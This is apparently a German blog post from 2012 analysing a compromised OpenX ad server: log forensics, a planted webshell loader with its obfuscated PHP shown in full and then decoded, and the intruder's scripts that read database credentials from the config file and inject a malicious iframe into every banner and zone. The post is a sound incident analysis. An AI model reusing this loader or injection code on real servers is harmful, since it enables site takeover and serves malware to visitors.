Aktionen eines Scriptkiddys
############################
:date: 2012-12-13 12:45
:tags: hack, webshell, scriptkiddy

Einleitung
----------
Um mal eine kurze Timeline aufzubauen. Am 11. Dec wurde entdeckt, dass ein Bannersystem
Schadcode ausliefert. Der Schadcode wurde am selben Tag auf ein paar Dateien eingegrenzt
den besagten Stellen geloescht und bekannte Luecken von OpenX gefixt sowie auf den 
aktuellen Stand gebracht.

Am naechsten Tag trat das Problem erneut auf. Es gab nun 2 Optionen: Sie haben noch eine
Backdoor auf dem Server, oder sie haben einen 0day in OpenX.

Analyse
-------

Ihhh, Logfiles
~~~~~~~~~~~~~~
Nachdem wir das ganze auf ein kleines Zeitfenster von 2h eingrenzen konnten (Bedenkt: es handelt
sich um ein Bannersystem welches an mehrere Server ausliefert), konnten wir uns die Logfiles 
genauer ansehen.

Zudem lag die Vermutung nahe, dass es ein Post Request sein musste und nicht aus unserem IP Range
kommt:

 .. code-block :: bash

    grep "10/Dec" access.log | grep "10:30:" | grep "POST" | grep -v "^iprange"

Das lieferte auch ein paar Treffer. Der Entscheidende war wohl dieser Zugriff.

 .. code-block :: plain
  
    74.82.195.138 - - [10/Dec/2012:13:10:48 +0100] "POST /www/images/8bbf14b5f28108caa48e940810f882f1.php HTTP/1.1" 200 520 "-" "MSIE 7.0; Windows 5.1;"

Sieht mir sehr nach einem komprimitiertem Datei Uploader aus. Aber lassen wir uns nicht nicht aus der Ruhe bringen. Ein Grepen nach der Datei
im Log foerderte noch zwei IPs zu Tage

 .. code-block :: plain

    74.82.195.138
    82.193.96.5
    88.198.84.237

Wenn man sich ein wenig in den Logfiles noch umschaut entdeckt man, dass die eine IP recht rege war in einem Plugin:

 .. code-block :: plain

   82.193.96.5 - - [10/Dec/2012:10:23:24 +0100] "POST [...]admin/plugins/openXSystemLog/logs.php HTTP/1.1" 200 [...]

Eine schnelle Google Suche liefert, dass das Plugin so nicht existiert. Ein wenig mehr herumstochern bringt auch zu Tage,
dass das Plugin kurz vorher hinzugefuegt wurde und erst danach war die seltsame Datei im images Ordner.
Daraufhin wurde das Plugin wieder geloescht. Es war weder in unserer Backup noch auf dem Server selbst zu finden.

Noch haben wir uns garnicht angeschaut was diese Datei alles tut.

PHP, noch mehr ihh
~~~~~~~~~~~~~~~~~~

 .. code-block :: php

   <?php
   function yf13015ce5bd6b5b1b371330(){}
   // ca. 2000 Zeilen spaeter
   function yf13015c8b7a8eef77f0f8db(){}
   function yf13015cc1424590ad55f2ea(){}
   function yf13015cfcbf(){}
   $uf16cd=w13dda(array(117,113,108,112,115,120,121));
   $g121b3fa=w13dda(array(125,110,110,125,101,67,122,117,112,104,121,110));
   $mf7737=w13dda(array(111,105,126,111,104,110));
   $ubeb9c=w13dda(array(121,106,125,112));
   $a9e1f8=w13dda(array(123,102,117,114,122,112,125,104,121));
   $ic8a9b=w13dda(array(108,125,127,119));
   $a4febd=w13dda(array(123,121,104,67,120,121,122,117,114,121,120,67,122,105,114,127,104,117,115,114,111));$c70bda=$a4febd();
   $qd89=null;$c70bda=$g121b3fa($c70bda[w13dda(array(105,111,121,110))], w13dda(array(123,46,127,36,41,121)));
   $wef9 = array(); foreach($c70bda as $f){$wef9[] = $mf7737($f,8);};
   eval($a9e1f8($ic8a9b(w13dda(array(84,54)),$uf16cd($qd89,$wef9))));
   function w13dda($o2ae){global $qd89; $ret = $qd89;for($i=0; $i < count($o2ae); $i++)$ret.=chr($o2ae[$i]) ^ chr(28);return $ret;}
   function g2c85e($o2ae){global $mf7737; return ($mf7737($o2ae,0,8)== w13dda(array(101,122,45,47,44,45,41,127)));}?>

Wer will raten?

Das eval sagt eigentlich schon alles. Was raus kommt ist eigentlich auch ziemlich klar. Interessant ist, wie er dort hinkommt. Ich droesel
das mal ein wenig auf.

Am Anfang definiert er sich "sinnlose" Funktionen. Das die garnicht so sinnlos sind, werde ich euch gleich zeigen.
Ich hab mal das ganze ein wenig kommentiert.

 .. code-block :: php

        <?php
        function yf13015ce5bd6b5b1b371330(){}
        // ca. 2000 Zeilen spaeter
        function yf13015c8b7a8eef77f0f8db(){}
        function yf13015cc1424590ad55f2ea(){}

        // Definieren von Funktionsnamen:
        // implode, array_filter, substr, eval, gzinflate, pack, get_defined_functions
        $uf16cd=w13dda(array(117,113,108,112,115,120,121));
        $g121b3fa=w13dda(array(125,110,110,125,101,67,122,117,112,104,121,110));
        $mf7737=w13dda(array(111,105,126,111,104,110));
        $ubeb9c=w13dda(array(121,106,125,112));
        $a9e1f8=w13dda(array(123,102,117,114,122,112,125,104,121));
        $ic8a9b=w13dda(array(108,125,127,119));
        $a4febd=w13dda(array(123,121,104,67,120,121,122,117,114,121,120,67,122,105,114,127,104,117,115,114,111));

        //ausfuehren von get_defined_functions -> liefert Array ueber ALLE Funktionsnamen
        # $c70bda = get_defined_functions();
        $c70bda=$a4febd();
        $qd89=null;

        // wendet die funktion g2c85e auf die user liste an
        // Es bleiben in c70bda nur die Funktionen die mit yf13015c anfangen.
        # $c70bda = array_filter($c70bda['user'],'g2c85e')
        $c70bda=$g121b3fa(
          $c70bda[w13dda(array(105,111,121,110))], w13dda(array(123,46,127,36,41,121))
        );
        $wef9 = array(); 

        // greift sich die Funktionsnamen und schneidet sie ersten 8 Zeichen ab
        foreach($c70bda as $f){
          # $wef9[] = substr($f,8);
          $wef9[] = $mf7737($f,8);
        }
        // Fuegt die einzelnen TeilFunktionsnamen zusammen, packt das ganze 
        // in eine Binaerzeichenkette, was dann wiederum gz gepackt ist.
        // Das ganze was da rauskommt (FileMan) wird ausgefuehrt
        # eval(gzinflate(pack('H*',implode(null,$wef9)
        eval($a9e1f8($ic8a9b(w13dda(array(84,54)),$uf16cd($qd89,$wef9))));

        // Verschluesselung: jede Ziffer wird als ASCII Wert genommen und mit dem ASCII von 28 xor'ed
        function w13dda($o2ae){
          global $qd89; 
          $ret = $qd89;
          for($i=0; $i < count($o2ae); $i++) 
            $ret.=chr($o2ae[$i]) ^ chr(28);
          return $ret;
        }

        // Filtert alle Funktionen aus dem User Namespace die 
        // die Zeichenkette enthalten
        function g2c85e($o2ae){
          global $mf7737; 
          # return (substr($02ae,0,8) == 'yf13015c')
          return ($mf7737($o2ae,0,8)== w13dda(array(101,122,45,47,44,45,41,127)));
        }

Damit ist schonmal geklaert wo die Shell untergebracht wurde: Die ist naemlich in den Funktionsnamen
als Binaer abgespeichert. Achja und komprimiert ist sie auch noch.

Gegenaktionen und Reaktion des ScriptKiddy
------------------------------------------

Nachdem wir uns sicher waren, was das genau macht haben wir uns auf die Lauer gelegt und die Webshell gegen eine Variante
ausgetauscht die nichts Boeses tut und alle Aktionen mitloggt. (Man koennte wirklich mal ein Repo mit modifizierten Shells machen)

Es kamen interessanterweise nach ein paar Minuten nach Bereinigung auch tatsaechlich Requests im Honeypot rein. Er nutzte die Shell 
wohl von einem Steuerungsscript aus, nachdem die Requests viel zu schnell kamen. 

Als allererstes hatten wir sein Passwort, dass er fuer FileMan verwendet.

 .. code-block :: plain

        yb[ezct,tdt,itkk

Das muss er eben uebermitteln, um sich erfolgreich an der Shell zu Authentifizieren. Im Source steht es naemlich mit nem doppel md5 drin.
Das hier wollte er auf dem Server ausfuehren und so Eintraege in die Banner machen. (Als ob wir geweint haben)

 .. code-block :: php

        <?php
        @ini_set('display_errors', 0);

        $init = array();
        $results = array();
        $counter = 0;

        // Geht Ordner runter bis root und liest config files
        while(getcwd() != '/')
        {
            $path = getcwd();
            $init = array_merge($init, get_openx_conf_files($path));
            chdir('../');    
            
            if($counter++ >= 30) {
            break;
            }
        }

        if(empty($init)) {
          echo "Error: OpenX INIT file not found!";
        }

        $cacheDir = dirname($init[0]) . '/var/cache/';

        // der Schade der eingefuegt wird in die Banner.
        $iframe = '' // base64 string truncated for space reason
        $iframe = base64_decode($iframe);

        include_once($init[0]);
        print_r(makeThemCryBabe($iframe, $conf['database']['host'], $conf['database']['username'], $conf['database']['password'], $conf['database']['name'], $conf['table']['prefix'], $cacheDir));
        // Wie kann man eine Funktion nur so nennen :(
        function makeThemCryBabe($iframe, $host, $user, $pass, $name, $prefix, $cacheDir)
        {
          $unlinked = 0;
          $link = mysql_connect($host, $user, $pass) or die(mysql_error());
          if ($link) {
            mysql_select_db($name) or die(mysql_error());
          }
          $_1 = "UPDATE `{$prefix}zones` SET `prepend` = '".mysql_real_escape_string($iframe)."', `forceappend` = 't'";
          $_2 = "UPDATE `{$prefix}zones` SET `append` = '".mysql_real_escape_string($iframe)."', `forceappend` = 't'";
          $_3 = "UPDATE `{$prefix}banners` SET `prepend` = '".mysql_real_escape_string($iframe)."'";
          $_4 = "ALTER TABLE `{$prefix}zones` CHANGE `prepend` `prepend` TEXT, CHANGE `append` `append` TEXT";
          
          mysql_query($_1) or die(mysql_error());
          
          $affected = mysql_affected_rows();
          $unlinked = 0;
      
          // Wenn es was veraendert hat loescht es den cache komplett, damit der Effekt gleich ist
          if ($affected > 0)
          {
            $cacheFiles = scandir($cacheDir);
            foreach($cacheFiles as $cache){
               $cachefile = $cacheDir . $cache;
               if(is_file($cachefile)){
                  if(unlink($cachefile)) $unlinked++;
               }
            }
          }
          return serialize(array('Affected:' => $affected, 'Cache Deleted:' => $unlinked));
        }


        function get_openx_conf_files($path)
        {
          $ret = array();
          $files = glob($path . "/init.php");

          if(is_array($files))
            $ret = $files;

          return $ret;
        }


Frage mich, warum er nicht auch gleich noch die Passwoerter ausgibt. Andererseits hat er eine Webshell...aw screw it :D

Andererseits wird er ja wohl merken, dass es so nichts bringt....Dachten wir uns zumindest. Um 16:30 kam ein Zugriff rein
der schon ein wenig anders aussah:

 .. code-block :: php

        <?php
        print_r(cleanItBabe($conf['database']['host'], $conf['database']['username'], $conf['database']['password'], $conf['database']['name'], $conf['table']['prefix']));

        function cleanItBabe($host, $user, $pass, $name, $prefix) {
            $unlinked = 0;
            $link = mysql_connect($host, $user, $pass) or die(mysql_error());

            if ($link) {
                mysql_select_db($name) or die(mysql_error());
            }
            $zones = \"UPDATE `{$prefix}zones` SET `prepend` = '', `append` = ''\";
            mysql_query($zones) or die(mysql_error());
            $zRes = mysql_affected_rows();
            $banners = \"UPDATE `{$prefix}banners` SET `prepend` = ''\";
            mysql_query($banners) or die(mysql_error());    
            $bRes = mysql_affected_rows();
            
            return serialize(array('Zones:' => $zRes, 'Banner:' => $bRes));
        }

Ich hab mal nur den Interessanten Part herausgesucht: Er versucht aufzuraeumen.

Jetzt aber endlich Schluss?
---------------------------

haha...dachten wir auch ja. Heute kam aber wieder ein Versuch etwas in der Datenbank einzutragen. Gleicher Skriptcode, so wie es auf den ersten Blick ausschaut.
Zu Vermerken waere noch, dass die IP Adressen alte Software Versionen enthaelt. Auf dem einen laeuft auch ein offener Proxy und stehen in Ukraine bzw. Russland.
Anzunehmen ist auch, dass er ein Windows System verwendet, wenn in der Shell sowas ankommt:

 .. code-block :: plain

        "@error_reporting(0);\r\n@ini_set('display_errors', 0);\r\n\r\n$init = array();\r\n

Zudem sieht mir das sehr Zusammengeklickt aus.

Hoffentlich wars das jetzt...wird langweilig seine Versuche.

so long
